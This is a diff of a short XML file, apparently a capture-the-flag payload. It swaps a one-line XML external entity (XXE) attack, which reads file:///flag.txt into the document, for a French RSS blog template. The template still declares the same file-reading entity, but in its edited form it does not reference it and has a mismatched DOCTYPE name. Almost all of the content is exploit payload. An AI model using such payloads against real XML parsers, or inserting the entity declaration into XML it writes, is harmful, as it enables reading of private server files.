@@ -1,1 +1,12 @@
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root>&test;</root>
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///flag.txt" >]>
+<rss version="2.0">
+<channel>
+    <title>Votre Titre de Blog</title>
+    <link>URL de votre blog</link>
+    <description>Description brève de votre blog</description>
+    <!-- Ajouter des éléments d'article ici -->
+</channel>
+</rss>
